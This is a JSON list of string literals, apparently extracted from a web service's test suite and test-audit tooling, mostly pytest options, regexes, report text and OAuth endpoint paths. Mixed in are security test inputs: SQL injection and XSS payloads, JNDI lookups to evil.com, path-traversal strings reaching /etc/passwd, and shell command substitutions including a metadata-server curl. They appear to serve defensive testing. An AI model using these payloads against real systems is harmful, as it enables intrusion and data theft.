{
  "values": [
    "\u0000\u0001\u0002BINARY_INJECTION\u0003\u0004",
    "\u001b[0m",
    "\u001b[0m -",
    "\u001b[91m",
    "\u001b[91mReal E2E Tests:",
    "!\nCurrent redirect URI:",
    "!\nCurrent:",
    "!\nOAuth redirect:",
    "!\nOAuth:",
    "!!! DANGEROUS MODE ENABLED !!!",
    "!=",
    "!= GET status",
    "!@#$%^&*()_+-=[]{}|;:,.<>?",
    "\"",
    "\" does not exist",
    "\"\"\"",
    "\"\"\"\n\nimport pytest\nfrom unittest.mock import Mock, patch, MagicMock\nimport sys\nfrom pathlib import Path\n\n# Add parent directory to path\n\nfrom",
    "\"\"\"\n    \n    @pytest.fixture(autouse=True)\n    def setup(self):\n        \"\"\"Set up test fixtures\"\"\"\n        self.mock_data = {\"test\": \"data\"}\n        yield\n        # Cleanup if needed",
    "\"\"\"\n        # Critical function - test error scenarios\n        with pytest.raises(Exception):\n            pass  # TODO: Add actual error test",
    "\"\"\"\n        # High complexity function - test boundary conditions\n        pass",
    "\"\"\"\n        # TODO: Implement based on function signature\n        # Function args:",
    "\"\"\"\nTests for",
    "\"\"\".*for testing.*\"\"\"",
    "\"\"\".*mock implementation.*\"\"\"",
    "\"\"\".*test implementation.*\"\"\"",
    "\"\"\"Split from",
    "\"\"\"Split test module - imports all parts.\"\"\"",
    "\"\"\"Test class for orphaned methods\"\"\"",
    "\"\"\"Test module.\"\"\"",
    "\",",
    "\",\"",
    "\": database \"netra_dev\" does not exist",
    "\"; DROP TABLE auth_users; --",
    "\"Authorization\": \"Bearer",
    "\"Authorization\": \"Bearer service-account-token\"",
    "\"Authorization\": \"Bearer valid-token\"",
    "\"ENVIRONMENT\": \"staging\"",
    "\"JWT_ALGORITHM\": \"HS256\"",
    "\"agent\"",
    "\"auth or security\"",
    "\"database or db\"",
    "\"e2e\"",
    "\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9\\.frontend-token-payload\\.signature\"",
    "\"integration\"",
    "\"not integration and not e2e\"",
    "\"oauth-hmac-secret-staging\"",
    "\"performance\"",
    "\"retry-token\"",
    "\"service-account-token\"",
    "\"smoke\"",
    "\"test-token\"",
    "\"websocket or ws\"",
    "#",
    "# ACT Secrets for local testing\nGITHUB_TOKEN=mock_github_token\nGCP_CREDENTIALS={\"type\":\"service_account\"}\nGCP_PROJECT_ID=mock-project\nDOCKER_REGISTRY=localhost:5000\nSTAGING_SSH_KEY=mock_ssh_key\nSTAGING_HOST=localhost\nSTAGING_USER=testuser\nSLACK_WEBHOOK_URL=https://mock.webhook.url",
    "# ACT environment detection - ACT sets this automatically",
    "# ACT will override",
    "# Add project root to path",
    "# Agent models - creating mocks for tests\nfrom unittest.mock import Mock\nAgent = Mock\nAgentRun = Mock",
    "# AgentRun model - creating mock for tests\nfrom unittest.mock import Mock\nAgentRun = Mock",
    "# ClickHouseManager - creating mock for tests\nfrom unittest.mock import Mock\nClickHouseManager = Mock",
    "# Complexity:",
    "# ConversionEvent model - creating mock for tests\nfrom unittest.mock import Mock\nConversionEvent = Mock",
    "# Critical Path Tests\nclass TestCriticalPaths:\n    \"\"\"Tests for critical execution paths\"\"\"",
    "# Database test fixtures - using mocks\nfrom unittest.mock import Mock, AsyncMock\nDatabaseErrorSimulator = Mock\nMockConnectionPool = Mock\nasync_session_mock = AsyncMock\nconnection_pool = Mock\ntransaction_session_mock = AsyncMock",
    "# FIXME:",
    "# Generated from",
    "# Has return:",
    "# Incomplete import statement",
    "# Justified:",
    "# Message model - creating mock for tests\nfrom unittest.mock import Mock\nMessage = Mock",
    "# Mock implementation",
    "# Mock justified",
    "# Project Real Test Requirements Violations",
    "# REDUNDANT TEST - Marked for removal by Autonomous Test Reviewer\\n# Reason: Duplicate coverage or obsolete functionality\\n# Review and remove if confirmed redundant\\n\\n",
    "# Real Service Test Report",
    "# Real Test Requirements Fix Plan",
    "# Real Test Requirements Violations Report",
    "# Real component behavior: \\1 handles \\2",
    "# Real component setup: \\1 configured for \\2",
    "# Run with coverage\n  python unified_test_runner.py --service backend --coverage --min-coverage 80\n  \n  # Run specific test file\n  python unified_test_runner.py --service backend netra_backend/tests/test_main.py\n  \n  # Run tests matching keyword\n  python unified_test_runner.py --service backend -k \"test_login\"\n  \n  # Quick smoke test\n  python unified_test_runner.py --service backend --category smoke --fail-fast\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service backend --coverage --html-output --json-output --parallel auto",
    "# Setup test path\\n(?=\\n)",
    "# TODO: Implement split test logic",
    "# Team model - creating mock for tests\nfrom unittest.mock import Mock\nTeam = Mock",
    "# Test Organization Audit Report\n\n## Executive Summary\n\nThe Netra codebase test organization analysis reveals opportunities for improvement in test structure and maintenance.\n\n## Current State Analysis\n\n### 1. Test File Distribution\n- **",
    "# Test Overlap Analysis Report",
    "# Test Size Compliance Report",
    "# Test Size Violations Report",
    "# Test implementation",
    "# Test stub",
    "# Thread model - creating mock for tests\nfrom unittest.mock import Mock\nThread = Mock",
    "# User journey data - creating mocks\nfrom unittest.mock import Mock\nUserTestData = Mock()\nUserJourneyScenarios = Mock()",
    "# UserFlowTestBase - using unittest.TestCase\nimport unittest\nfrom unittest.mock import Mock\nUserFlowTestBase = unittest.TestCase\nassert_successful_registration = Mock\nassert_plan_compliance = Mock",
    "# Workflow Status Verification Results\n\n## Script Functionality Verification\n\nThe verify_workflow_status.py script has been thoroughly tested and verified to work correctly.\n\n### Key Findings:\n\n1. **Argument Validation**: ‚úÖ WORKING\n   - Properly validates required arguments\n   - Correctly handles invalid argument combinations\n   - Provides clear error messages\n\n2. **Authentication Handling**: ‚úÖ WORKING\n   - Properly checks for GitHub token\n   - Handles missing tokens gracefully\n   - Attempts API calls and handles authentication failures\n\n3. **Error Handling**: ‚úÖ WORKING\n   - Gracefully handles API errors\n   - Provides meaningful error messages\n   - Uses proper exit codes\n\n4. **Output Formatting**: ‚úÖ WORKING\n   - Accepts both table and JSON output formats\n   - Processes arguments correctly\n\n5. **Help System**: ‚úÖ WORKING\n   - Displays comprehensive help text\n   - Shows usage examples\n\n### Test Results:",
    "# Workflow Status Verification Test Report\n\n## Summary\n- **Total Tests**:",
    "##",
    "## Cache Performance",
    "## Category Analysis",
    "## Database Performance",
    "## Errors",
    "## Exact Duplicates ‚ö†Ô∏è",
    "## Executive Summary",
    "## File Splits Required",
    "## Function Refactoring Required",
    "## Highly Similar Tests",
    "## Identified Issues\n\n### 1. Configuration Sprawl",
    "## Immediate Fixes (Can be automated)",
    "## Impact Analysis",
    "## LLM API Usage",
    "## Mock Reduction Required",
    "## Most Problematic Files",
    "## Quality Gate Scores",
    "## Recommendations",
    "## Recommendations\n\n### Immediate Actions (Priority 1)\n1. **Consolidate Configuration**: Reduce conftest.py files to service-level only\n2. **Standardize Naming**: Use consistent `test_*.py` pattern\n3. **Archive Legacy Tests**: Move or remove legacy test directories\n\n### Short-term Improvements (Priority 2)\n1. **Simplify Test Framework**: Reduce test_framework to essential components\n2. **Unify Test Runners**: Single test runner with clear options\n3. **Clear Test Levels**: Define and document 3-5 clear test levels\n\n### Long-term Goals (Priority 3)\n1. **Test Organization**: Group tests by domain/service\n2. **Performance Optimization**: Implement proper parallel execution\n3. **Documentation**: Single source of truth for test guidelines\n\n## Business Impact\n\n- **Development Velocity**: Test complexity impacts productivity\n- **Maintenance Burden**: Complex structure requires more maintenance\n- **Quality Assurance**: Disorganized tests reduce confidence\n\n## Next Steps\n\n1. Run this audit regularly to track improvements\n2. Prioritize fixes based on development impact\n3. Document decisions in SPEC/learnings/testing.xml",
    "## Splitting Suggestions",
    "## Summary",
    "## Test Details by Category",
    "## Test Results Summary",
    "## Test Validation Status",
    "## Top 20 Worst Violators",
    "## Violations",
    "## Violations by Type",
    "## Warnings",
    "## ‚ö†Ô∏è WARNING",
    "## üéØ Priority Fix List",
    "## üìã Violations by Category",
    "## üõ†Ô∏è Recommended Actions",
    "###",
    "### 2. Test Locations\n\nTop test directories by file count:",
    "### 2. Test Organization",
    "### 3. Organizational Patterns\n\n#### 3.1 Test Naming Conventions",
    "### 4. Key Test Directories",
    "### File Size Violations",
    "### Function Size Violations",
    "### Similarity Breakdown",
    "#### 3.2 Test Structure\n- Test directories:",
    "$",
    "$(",
    "$(STAGING_DB_PASSWORD)",
    "$(curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/id)",
    "$(date +%s)",
    "$(echo \"${BASE_SERVICE}-${ENV_SUFFIX}\")",
    "$(echo \"${K_SERVICE}-${HOSTNAME}\")",
    "$(echo \"${LONG_VALUE}-${LONG_VALUE}-${LONG_VALUE}\")",
    "$(echo $USER)",
    "$(hostname)",
    "$(id -un)",
    "$(uname -n)",
    "$(whoami | tr -d \"\\n\")",
    "$(whoami)",
    "$(whoami)-$(hostname)",
    "$HOSTNAME",
    "$RANDOM",
    "$USER",
    "$argon2id$",
    "${",
    "${BASE_SERVICE}",
    "${ENV_SUFFIX}",
    "${HOSTNAME}",
    "${INSTANCE_ID}",
    "${INSTANCE_ID}-${REGION}",
    "${K_SERVICE}",
    "${REGION}",
    "${TIMEOUT}",
    "${jndi:ldap://evil.com/exploit}",
    "${jndi:ldap://malicious-server/exploit}",
    "%",
    "%\n\n## Test Results",
    "% goal",
    "% to reach",
    "% to target 85%",
    "%(asctime)s - %(levelname)s - %(message)s",
    "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    "%)",
    "%)\n\n### Conclusion:\nThe script is **PRODUCTION READY** and properly handles:\n- GitHub API connectivity (when valid token provided)\n- Argument validation and error handling\n- Multiple output formats\n- Workflow status verification\n\nAll \"failures\" in testing are **expected behaviors** when using invalid tokens or non-existent repositories.\nThe script correctly identifies these scenarios and reports appropriate errors.",
    "%, target: 75%)",
    "%Y%m%d_%H%M%S",
    "%Y-%m-%d %H:%M:%S",
    "&",
    "&state=",
    "&state=123456",
    "&state=invalid_state",
    "&state=other_session_state",
    "&state=predictable_state",
    "&state=reused_state_123",
    "'",
    "' (current:",
    "' (length:",
    "' -> '",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "' appears too frequently:",
    "' but defaults to 'postgres':",
    "' caused expected failure:",
    "' caused sensitive error:",
    "' converted to:",
    "' correctly caused ValueError:",
    "' correctly resolves to:",
    "' database config failed:",
    "' defined in test file",
    "' degradation policy violations:",
    "' exceeds",
    "' exposed sensitive information:",
    "' extracted sensitive information:",
    "' failed with unexpected error:",
    "' fails with user-unfriendly error:",
    "' from Secret Manager. Actual calls:",
    "' from command '",
    "' from input '",
    "' gets technical error response: '",
    "' has",
    "' has high average complexity (",
    "' incorrectly resolves to 'postgres' database:",
    "' incorrectly uses 'netra_dev' database:",
    "' into smaller, focused test functions",
    "' not configured",
    "' not found",
    "' not in execution list",
    "' not properly validated:",
    "' resulted in non-positive value:",
    "' resulted in unreasonably large value:",
    "' should not convert to float:",
    "' should resolve to '",
    "' should return None, got:",
    "' spans",
    "' succeeded in degraded state:",
    "' to a shared fixture or use real components",
    "' to a shared test utility module or use real components",
    "'''",
    "', got '",
    "'. Degraded state should provide clear, non-technical error messages.",
    "'. Expected user-friendly response like: '",
    "':",
    "': '",
    "': Expected pass=",
    "'; DROP TABLE oauth_codes; --",
    "'; DROP TABLE users; --",
    "'; INSERT INTO users VALUES('hacker','pass'); --",
    "'; eval(atob('YWxlcnQoJ1hTUycpOw=='));//",
    "';alert('XSS');//",
    "(",
    "()",
    "() -",
    "() needs fix:\nCURRENT (BROKEN):",
    "() returned empty value in staging",
    "() returned placeholder: '",
    "():",
    "(*args, **kwargs):\n    \"\"\"Create item - test stub implementation.\"\"\"\n    return {\"status\": \"created\", \"id\": \"new_id\"}",
    "(*args, **kwargs):\n    \"\"\"Delete item - test stub implementation.\"\"\"\n    return {\"status\": \"deleted\"}",
    "(*args, **kwargs):\n    \"\"\"Get all items - test stub implementation.\"\"\"\n    return []",
    "(*args, **kwargs):\n    \"\"\"Process data - test stub implementation.\"\"\"\n    return {\"status\": \"processed\", \"result\": \"success\"}",
    "(*args, **kwargs):\n    \"\"\"Stream data - test stub implementation.\"\"\"\n    for i in range(3):\n        yield f\"Chunk {i+1}\"",
    "(*args, **kwargs):\n    \"\"\"Test stub implementation for",
    "(*args, **kwargs):\n    \"\"\"Update item - test stub implementation.\"\"\"\n    return {\"status\": \"updated\", \"id\": kwargs.get('id', '1')}",
    "(*args, **kwargs):\n    \"\"\"Verify/validate - test stub implementation.\"\"\"\n    return True",
    "(?:# Add project root to path\\n)?import sys\\nfrom pathlib import Path\\nPROJECT_ROOT = Path\\(__file__\\)\\.parent\\.parent\\.parent\\nif str\\(PROJECT_ROOT\\) not in sys\\.path:\\n    sys\\.path\\.insert\\(0, str\\(PROJECT_ROOT\\)\\)\\n\\n?\\n?",
    "(?:async )?def (test_\\w+)",
    "(?:test|it|describe)\\s*\\(\\s*['\\\"`]([^'\\\"`]+)['\\\"`]",
    "(@pytest\\.mark\\.\\w+)\\s*\\n\\s*\\n\\s*(async def)",
    "(@pytest\\.mark\\.\\w+)\\s*\\n\\s*\\n\\s*(def)",
    "(@pytest\\.mark\\.real_llm.*?\\n)(class |def |async def )",
    "(Address when convenient)",
    "(JS/TS)",
    "(Must fix immediately)",
    "(Priority:",
    "(Score:",
    "(Should fix soon)",
    "([\\w/\\\\\\.]+::\\S+)",
    "([^\\s]+\\.py)",
    "(\\d+) failed",
    "(\\d+) failed.*(\\d+) passed",
    "(\\d+) passed",
    "(\\d+)\\s+passed.*?(\\d+)\\s+total",
    "(\\s+)def __init__\\(self\\):\\s*\\n(\\s+)super\\(\\).__init__\\(\\)\\s*\\n",
    "(\\w+)\\.return_value = (.+)",
    "(\\w+)\\.side_effect = (.+)",
    "(\\w+)\\s*\\(",
    "(^|\\n)(async def",
    "(^|\\n)(class",
    "(class TestSyntaxFix.*?\\n)(.*?)(?=\\nclass |\\Z)",
    "(currently",
    "(end-to-end tests)",
    "(exception)",
    "(excluding dependencies)",
    "(expected format: resource:action)",
    "(expected:",
    "(integration tests)",
    "(matched:",
    "(self):",
    "(self):\n        \"\"\"Test",
    "(shared utilities)",
    "(similarity:",
    "(too large)",
    "(under 300 line limit)",
    "(unit tests)",
    "(~",
    ")",
    ") -",
    ") indicates no circuit breaker",
    ") indicates poor overload handling",
    "). Consider breaking down complex tests into simpler units.",
    ")...",
    "):",
    "): Creates confusion",
    "): Overlapping functionality",
    "): Should be consolidated",
    ")[/red]",
    "*",
    "* netra_pr-* (PR databases)",
    "* netra_pr_branch_* (PR databases)",
    "* postgres (system database)",
    "**",
    "** (",
    "** -",
    "***",
    "*** ALL WEBSOCKET TESTS PASSED! ***",
    "**/",
    "**/*.py",
    "**/*.test.js",
    "**/*.test.jsx",
    "**/*.test.ts",
    "**/*.test.ts*",
    "**/*.test.tsx",
    "**/*_l3.py",
    "**/*_test.py",
    "**/__tests__/**/*.js",
    "**/__tests__/**/*.jsx",
    "**/__tests__/**/*.ts",
    "**/__tests__/**/*.tsx",
    "**/__tests__/@(components|hooks|store|services|lib|utils)/**/*.test.[jt]s?(x)",
    "**/__tests__/integration/**/*.test.[jt]s?(x)",
    "**/__tests__/integration/critical-integration.test.tsx",
    "**/__tests__/system/startup.test.tsx",
    "**/conftest.py",
    "**/e2e/**",
    "**/integration/**",
    "**/jest.setup.js",
    "**/performance/**",
    "**/security/**",
    "**/setupTests.js",
    "**/test*.py",
    "**/test_*.py",
    "**/tests/**/*.py",
    "**/unit/**",
    "**Description**:",
    "**Duration:**",
    "**Error**:\n```",
    "**Exit Code**:",
    "**Generated:**",
    "**IMPORTANT:** Manual refactoring is strongly recommended over automatic fixes.",
    "**Output**:\n```",
    "**Top Overlaps:**",
    "**Total LLM Cost:** $",
    "**Total Violations:**",
    "**‚ö†Ô∏è WARNING:** Some tests are already failing. Fix these before refactoring!",
    "*.json",
    "*.py",
    "*.spec.*",
    "*.spec.ts",
    "*.spec.tsx",
    "*.test.*",
    "*.test.js",
    "*.test.jsx",
    "*.test.ts",
    "*.test.ts*",
    "*.test.tsx",
    "*.ts",
    "*.tsx",
    "*.yml",
    "*_test.py",
    "*test*.py",
    "*test*.ts",
    "*test.py",
    "+",
    "+ '/auth/callback' =",
    "+ Cloud SQL SSL parameters handled correctly",
    "+ Engine created successfully",
    "+ Engine created with connection pool",
    "+ Engine creation configuration valid",
    "+ Engine disposed successfully",
    "+ URL conversion successful",
    "+ URL format valid",
    "+00:00",
    ",",
    ", Actual behavior:",
    ", Actual pass=",
    ", Got:",
    ", HEAD:",
    ", Improvement:",
    ", Optimization:",
    ", SPEC/testing.xml)",
    ", convert=",
    ", expected pattern",
    ", first import at line",
    ", got",
    ", got:",
    ", jest.mock:",
    ", max_files=",
    ", not testing HEAD",
    ", service2=",
    ", skipping",
    ", skipping HEAD test",
    ", skipping redirect_uri test",
    ", skipping state test",
    ", type:",
    ", using 'unit'",
    ", using simple line counting:",
    ", ~",
    ",\"",
    ",line=",
    "-",
    "- **",
    "- **Average Score:**",
    "- **Critical:**",
    "- **Exact Duplicates**:",
    "- **Exact Duplicates**: 0 ‚úÖ",
    "- **Excessive conftest files** (",
    "- **Failed**:",
    "- **Failed:**",
    "- **Files exceeding",
    "- **Functions exceeding",
    "- **Highly Similar**:",
    "- **Hit Rate:**",
    "- **Hits:**",
    "- **Inconsistent L3 pattern** used in",
    "- **Legacy test directories** found:",
    "- **Major:**",
    "- **Max Score:**",
    "- **Min Score:**",
    "- **Minor:**",
    "- **Misses:**",
    "- **Multiple test configurations** (",
    "- **Multiple test runners** (",
    "- **Non-standard naming** in",
    "- **Pass Rate:**",
    "- **Passed**:",
    "- **Passed:**",
    "- **Related**:",
    "- **Similar**:",
    "- **Success Rate**:",
    "- **Suggestion:** Extract helper methods or use fixtures",
    "- **Suggestion:** Split into multiple focused test modules",
    "- **Total Similarity Pairs**:",
    "- **Total Test Files**:",
    "- **Total Test Functions**:",
    "- **Total Tests:**",
    "- **Total Validations:**",
    "- **Total test files scanned:**",
    "- **Total violations:**",
    "- ... and",
    "- API:",
    "- All secrets come from Google Secret Manager",
    "- All services correctly default to STAGING (not production)",
    "- Allow dev login:",
    "- Allow mock auth:",
    "- App:",
    "- Apps skip .env loading when ENVIRONMENT=staging",
    "- Auth service trying to connect to 'postgres' database",
    "- Auth:",
    "- Available databases on instance:",
    "- Avg Complexity:",
    "- But application schema might not exist in 'postgres' database",
    "- But code was expecting 'netra_staging'",
    "- CLAUDE.md (development standards)",
    "- CRITICAL:",
    "- Check if 'postgres' DB has auth tables",
    "- Cloud SQL Unix socket connection (secure)",
    "- Commands are DRY RUN only (no actual migration)",
    "- Configuration files:",
    "- Confirm session management",
    "- Conftest files:",
    "- Cross-Category Overlaps:",
    "- Deploy with corrected credentials",
    "- Duplicates:",
    "- Ensure auth service tables exist in target database",
    "- Ensures AI quality meets expectations",
    "- Environment detection logic works as expected",
    "- Errors in",
    "- Failed:",
    "- Failing:",
    "- File size violations:",
    "- Fixed",
    "- Frontend:",
    "- Full customer journey validation",
    "- Function size violations:",
    "- Highly Similar:",
    "- Integration tests with mocks defeat the purpose of integration testing",
    "- Internal Overlaps:",
    "- MAJOR:",
    "- MINOR:",
    "- Max violation:",
    "- Mock component implementations in test files violate real test requirements",
    "- Monitor logs for connection success",
    "- No .env.staging file (deleted)",
    "- Non-secret config in deployment script as env vars",
    "- OAuth configuration appropriate for each environment",
    "- OR 'postgres' database doesn't have the required tables/schema",
    "- OR create 'netra_staging' database for staging",
    "- Passed:",
    "- Passing:",
    "- Risk of false positive test results hiding real bugs",
    "- Run Alembic migrations if needed",
    "- SPEC/testing.xml (comprehensive testing standards)",
    "- SSL parameters handled automatically",
    "- Secret Manager postgres-db-staging = 'postgres'",
    "- Skipped",
    "- Test directories:",
    "- Test locations:",
    "- Test login flow",
    "- Test runners found:",
    "- Tests validated:",
    "- Tests:",
    "- Total Lines:",
    "- Total test files:",
    "- Total violations:",
    "- Using psycopg2 driver for Alembic compatibility",
    "- Validates SLA compliance",
    "- Verify JWT token generation",
    "- [ ]",
    "- [CRITICAL]:",
    "- [MAJOR]:",
    "- [MINOR]:",
    "- `",
    "- app/tests/examples/test_real_functionality_examples.py (patterns)",
    "- tests are already failing",
    "--",
    "---",
    "--- Iteration",
    "--- Progress Summary ---",
    "--all",
    "--allow-prod",
    "--api-port",
    "--asyncio-mode=auto",
    "--auth-url",
    "--auto-split",
    "--backend-url",
    "--backup-dir",
    "--bail",
    "--base-url",
    "--benchmark",
    "--build",
    "--cache-dir",
    "--cacheDirectory",
    "--categories",
    "--category",
    "--check-deps",
    "--cleanup-on-exit",
    "--clear-cache",
    "--color=yes",
    "--confirm-unsafe",
    "--cov",
    "--cov-fail-under=",
    "--cov-report=html",
    "--cov-report=html:reports/coverage/html",
    "--cov-report=json",
    "--cov-report=json:reports/coverage/coverage.json",
    "--cov-report=term-missing",
    "--cov=",
    "--cov=.",
    "--cov=app",
    "--cov=netra_backend.app",
    "--coverage",
    "--coverage=false",
    "--coverageDirectory=",
    "--cypress-open",
    "--detectOpenHandles",
    "--directory",
    "--disable-auto-split",
    "--disable-safe-mode",
    "--disable-warnings",
    "--docker",
    "--dry-run",
    "--dry-run, -n     : Show what would be renamed without doing it",
    "--durations=20",
    "--e2e",
    "--env",
    "--exclude-env",
    "--execute",
    "--execute         : Actually perform the renames",
    "--execute --limit=30",
    "--fail-fast",
    "--fail-fast-mode",
    "--failed-first",
    "--fast-fail",
    "--ff",
    "--file",
    "--fix",
    "--force",
    "--force-unsafe-fix",
    "--forceExit",
    "--format",
    "--frontend-port",
    "--full",
    "--git-diff",
    "--github-actions",
    "--help",
    "--help, -h        : Show this help",
    "--host",
    "--html-output",
    "--html=reports/tests/report.html",
    "--install-deps",
    "--integration-first",
    "--isolation",
    "--iterations",
    "--json",
    "--json-output",
    "--json-report",
    "--json-report-file=reports/tests/report.json",
    "--json-report-file=test_results.json",
    "--keyword",
    "--level",
    "--limit=",
    "--limit=N, -lN    : Process only first N files",
    "--lint",
    "--list",
    "--list-categories",
    "--markers",
    "--max-files",
    "--max-workers",
    "--maxWorkers=",
    "--maxWorkers=1",
    "--maxWorkers=2",
    "--maxfail=1",
    "--maxfail=50",
    "--min-coverage",
    "--module",
    "--name-only",
    "--no-bad-test-detection",
    "--no-browser",
    "--no-cache",
    "--no-coverage",
    "--no-env-setup",
    "--no-fail-fast",
    "--no-header",
    "--no-summary",
    "--no-wait",
    "--noEmit",
    "--optimization",
    "--output",
    "--parallel",
    "--passWithNoTests",
    "--pattern",
    "--port",
    "--profile",
    "--progress-mode",
    "--project-root",
    "--quick",
    "--quiet",
    "--real-e2e",
    "--real-llm",
    "--real-services",
    "--reload",
    "--repo",
    "--report",
    "--report-only",
    "--resume-from",
    "--root-dir",
    "--run-id",
    "--scan",
    "--scan-all",
    "--secret-file",
    "--self-contained-html",
    "--service",
    "--set-secrets",
    "--show-category-stats",
    "--show-warnings",
    "--simulate",
    "--spec",
    "--splitting-strategy",
    "--strategy",
    "--strict",
    "--strict-markers",
    "--tb=no",
    "--tb=short",
    "--testMatch",
    "--testNamePattern=",
    "--testPathPattern=__tests__/(components|hooks|store)",
    "--timeout-keep-alive",
    "--timeout=",
    "--timeout=5",
    "--token",
    "--type-check",
    "--update-snapshots",
    "--updateSnapshot",
    "--validate",
    "--validate-tests",
    "--verbose",
    "--version",
    "--wait-for-completion",
    "--wait-for-completion requires --workflow-name",
    "--watch",
    "--window-size",
    "--workers",
    "--workflow-name",
    "-01",
    "-5",
    "->",
    "-> _determine_urls()[0]",
    "-P",
    "-W",
    "-_",
    "-b",
    "-c",
    "-d",
    "-e",
    "-f",
    "-h",
    "-host",
    "-k",
    "-l",
    "-m",
    "-n",
    "-name",
    "-o",
    "-p",
    "-q",
    "-rN",
    "-s",
    "-t",
    "-type",
    "-u",
    "-v",
    "-vv",
    "-w",
    "-x",
    "-xvs",
    ".",
    ". After database recovery, health check should validate system state.",
    ". Broken database state should not leak system details to potential attackers.",
    ". Consider consolidating or improving test coverage.",
    ". Current health:",
    ". Current monitoring data:",
    ". Database connectivity should be validated.",
    ". Database error messages should be sanitized before logging or returning to users.",
    ". Database migration status should be included in health validation.",
    ". Degraded instances should not receive full traffic routing. Health/readiness checks should indicate reduced capacity.",
    ". Degraded state errors should be user-friendly and explain service limitations.",
    ". Degraded state should have consistent error handling.",
    ". Error handling should prevent information disclosure.",
    ". Error messages should be sanitized to prevent log injection attacks.",
    ". Even in development, database connectivity should be properly validated.",
    ". Expected action:",
    ". Expected one of:",
    ". External monitoring needs detailed database connectivity status.",
    ". Health check should detect when database issues cause component failures.",
    ". Health check should track recovery progress and report transitional states.",
    ". Health check should validate all database connectivity aspects.",
    ". Health should clearly show when service is degraded.",
    ". Missing application database configuration is causing the connectivity issue.",
    ". Need detailed degradation status for proper monitoring.",
    ". Operations should fail with clear error messages when database is unavailable.",
    ". Security validations should fail securely when database is unavailable.",
    ". Service should either fail to start OR clearly communicate degraded state.",
    ". System should detect and communicate when full functionality is restored.",
    ". System should not expose internal details to automated scanners when database is broken.",
    ". Testing URL:",
    ". This database doesn't exist and causes connection failures.",
    ". This is likely the source of the 'database postgres does not exist' error.",
    ". Validation should warn about using the system database instead of application database.",
    ". When 'netra_dev' database doesn't exist, service should not be ready.",
    ". When 'netra_dev' doesn't exist, service should fail to start or report unhealthy.",
    ". [",
    ". `",
    ".\"\"\"",
    ".\"\"\"\n    return {\"status\": \"ok\"}",
    "..",
    "...",
    "...\n[bold]Redirect URI:[/bold]",
    "... and",
    "...[/cyan]",
    "../../../etc/passwd",
    "../reports/frontend-coverage",
    ".1%",
    ".1f",
    ".2%",
    ".2f",
    ".3f",
    ".4f",
    ".6f",
    ".<40",
    ".cache",
    ".coverage",
    ".db",
    ".eggs",
    ".env",
    ".env.staging",
    ".env.test",
    ".env.test*",
    ".git",
    ".github",
    ".idea",
    ".invalid_signature",
    ".jpg",
    ".js",
    ".json",
    ".jsx",
    ".mypy_cache",
    ".py",
    ".pytest_cache",
    ".return_value =",
    ".ruff_cache",
    ".secrets",
    ".service_discovery",
    ".signature",
    ".tampered",
    ".test",
    ".test.",
    ".test.ts",
    ".test.tsx",
    ".test_backups_",
    ".tox",
    ".ts",
    ".tsx",
    ".venv",
    ".vs",
    ".vscode",
    ".yaml",
    "/",
    "/ directory...",
    "/**/*.test.[jt]s?(x)",
    "/..",
    "/.env",
    "/100",
    "/100 ---",
    "/100 ===",
    "/__init__.py",
    "/_next/static",
    "/`",
    "/`:",
    "/admin",
    "/api/admin/shutdown",
    "/api/agents",
    "/api/health",
    "/api/threads",
    "/api/threads/",
    "/api/user/me",
    "/api/user/profile",
    "/api/workspaces",
    "/app/tests/integration/",
    "/auth/",
    "/auth/../../../etc/passwd",
    "/auth/callback",
    "/auth/callback\nActual:",
    "/auth/callback endpoint returns non-404 status",
    "/auth/callback/google",
    "/auth/callback/google endpoint returns non-404 status",
    "/auth/callback/google?code=test_code&state=test_state",
    "/auth/callback?",
    "/auth/callback?code=",
    "/auth/callback?code=../../../etc/passwd",
    "/auth/callback?code=<script>&state=test",
    "/auth/callback?code=test%00&state=test",
    "/auth/callback?code=test&state=",
    "/auth/callback?code=test' OR '1'='1&state=test",
    "/auth/callback?code=test; DROP TABLE users;&state=test",
    "/auth/callback?code=test_code",
    "/auth/callback?code=test_code&state=",
    "/auth/callback?code=test_code&state=test_state",
    "/auth/callback?code=valid_code&state=",
    "/auth/callback?error=access_denied&state=test_state",
    "/auth/callback?state=test",
    "/auth/callback?state=test_state",
    "/auth/config",
    "/auth/dev-login",
    "/auth/dev_login",
    "/auth/github",
    "/auth/google",
    "/auth/google/callback",
    "/auth/health",
    "/auth/login",
    "/auth/login/facebook",
    "/auth/login/github",
    "/auth/login/google",
    "/auth/login?provider=",
    "/auth/login?provider=google",
    "/auth/login?provider=google&scope=",
    "/auth/login?provider=invalid_provider",
    "/auth/logout",
    "/auth/me",
    "/auth/password",
    "/auth/refresh",
    "/auth/service-token",
    "/auth/sessions",
    "/auth/sessions/",
    "/auth/token",
    "/auth/user",
    "/auth/validate",
    "/auth/verify",
    "/auth/websocket/auth",
    "/auth?user=admin",
    "/auth_service/",
    "/backup",
    "/callback",
    "/cgi-bin/test",
    "/cloudsql/",
    "/cloudsql/invalid-format",
    "/cloudsql/netra-staging:us-central1:netra-staging-db",
    "/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "/cloudsql/prod-project:us-central1:prod-instance",
    "/cloudsql/project:region:instance",
    "/config",
    "/docs",
    "/e2e/",
    "/etc/passwd",
    "/health",
    "/health/",
    "/health/../admin",
    "/health/live",
    "/health/ready",
    "/health?debug=true",
    "/health?id=1",
    "/integration/",
    "/messages",
    "/netra_staging",
    "/oauth/config",
    "/oauth/providers",
    "/openapi.json",
    "/postgres",
    "/readiness",
    "/readiness?debug=1",
    "/secrets/",
    "/secure",
    "/status",
    "/tests/",
    "/tests/e2e/",
    "/tests/integration/",
    "/tests/unified/e2e/",
    "/tests/unit/",
    "/unit/",
    "/v1",
    "/versions/latest",
    "/wp-admin",
    "/ws",
    "/ws/config",
    "/ws/health",
    "0",
    "0.0.0.0",
    "00-",
    "1",
    "1!",
    "1' OR 1=1 UNION SELECT @@version --",
    "1. **Fix Critical Violations First** - Address mock component implementations",
